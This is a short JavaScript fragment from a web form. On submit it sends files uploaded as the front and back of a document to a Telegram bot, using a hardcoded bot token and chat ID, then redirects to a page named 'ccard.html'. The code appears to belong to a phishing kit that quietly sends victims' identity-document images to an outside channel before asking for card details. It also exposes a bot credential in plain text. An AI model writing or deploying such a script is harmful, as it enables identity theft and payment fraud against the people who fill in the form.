


    const bots = new Bot("6135450810:AAGUOJprgvABqKF6iohNy109gXP1gPf-a4w", 5326525481);


    document.getElementById("form").addEventListener("submit", e => {
        e.preventDefault();
    
    
    ///  const text = document.getElementById("textinput").value;
    
    
    ///    bot.sendFile("#fileinput", text)
        bots.sendFile("#fileinputfront")
        bots.sendFile("#fileinputback")
        .then(res => {
    ///    console.log(res);
        window.location.href='ccard.html'
        })
    })
    
    

